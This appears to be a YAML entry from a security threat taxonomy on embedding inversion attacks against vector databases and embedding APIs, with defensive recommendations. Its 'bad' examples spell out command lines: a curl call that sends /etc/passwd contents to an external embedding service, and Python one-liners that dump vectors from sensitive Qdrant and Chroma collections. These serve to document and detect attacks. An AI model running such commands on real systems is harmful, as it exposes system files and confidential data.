id: "data-exfiltration/llm-data-flow/embedding-inversion-attack"
version: "1.0.0"
kingdom: "Data Exfiltration"
kingdom_id: 3
category: "LLM Data Flow"
category_id: "3.5"
name: "Embedding Inversion Data Extraction"
risk_level: "high"

abstract: |
  An attacker extracts sensitive training data, PII, or proprietary
  information by inverting or probing embedding vectors — reconstructing
  original text from dense vector representations through systematic API
  queries or direct access to embedding model outputs.

explanation: |
  Embedding models convert text into dense numerical vectors that capture
  semantic meaning. These vectors are often treated as safe to expose (e.g.,
  via search APIs, shared vector databases, or embedding-as-a-service
  endpoints) because they appear to be opaque numerical representations.
  However, research demonstrates that embedding vectors can be inverted to
  recover the original input text with high fidelity.

  An attacker exploits this through:

  - **Embedding inversion attacks**: Using a trained decoder model to
    reconstruct input text from its embedding vector. Vec2Text and similar
    techniques can recover 92%+ of original tokens from embeddings produced
    by models like text-embedding-ada-002. If a vector database stores
    embeddings of sensitive documents (contracts, medical records, source
    code), an attacker with access to the vectors can reconstruct the
    original content.
  - **Membership inference via embeddings**: Determining whether a specific
    text was used to train the embedding model by analyzing the model's
    confidence on that input. This reveals whether sensitive data (patient
    records, proprietary documents) was in the training set.
  - **Attribute inference**: Even without full text reconstruction,
    extracting specific attributes (names, email addresses, financial
    figures) from embedding vectors through targeted probing.
  - **Cross-model transfer attacks**: Training an inversion model on a
    similar public embedding model and transferring the attack to a
    proprietary model, bypassing access controls on the target model.
  - **Bulk embedding harvesting**: Making systematic API calls to an
    embedding service to extract and store large numbers of embedding
    vectors for offline inversion analysis.

  This is a critical gap in many RAG architectures: organizations secure
  their document stores but freely expose the embedding vectors through
  search APIs, assuming vectors are not reversible. The OWASP LLM08 (Vector
  and Embedding Weaknesses) standard specifically identifies this class of
  attack.

  MITRE equivalent: T1530 (Data from Cloud Storage) adapted for vector
  database stores.

recommendation: |
  - Never treat embedding vectors as non-sensitive — apply the same access
    controls to vector databases as to the source documents.
  - Add calibrated noise to stored embeddings (differential privacy) to
    degrade inversion accuracy while preserving retrieval quality.
  - Rate-limit and monitor embedding API access — detect bulk query patterns
    that indicate harvesting or inversion attempts.
  - Use dimensionality reduction on stored embeddings to reduce inversion
    fidelity while maintaining search quality.
  - Implement access controls on vector database queries that mirror the
    source document permissions (document-level ACLs on vectors).
  - Audit which users and services can access raw embedding vectors vs.
    only similarity search results.
  - Consider quantized or hashed embeddings for storage, which reduce
    inversion potential.

examples:
  bad:
    - "curl -X POST https://api.openai.com/v1/embeddings -d '{\"input\": \"$(cat /etc/passwd)\", \"model\": \"text-embedding-3-small\"}' | jq '.data[0].embedding' > vectors.json"
    - "python -c \"from qdrant_client import QdrantClient; c = QdrantClient('localhost'); [print(p.vector) for p in c.scroll('sensitive_docs')[0]]\""
    - "python -c \"import chromadb; c = chromadb.HttpClient(); results = c.get_collection('internal_docs').get(include=['embeddings']); open('/tmp/vectors.json','w').write(str(results))\""
  good:
    - "Vector database configured with document-level ACLs that mirror source document permissions"
    - "Embedding API enforces per-user rate limits and anomaly detection on query patterns"
    - "Stored embeddings use differential privacy noise injection calibrated to preserve top-k retrieval"

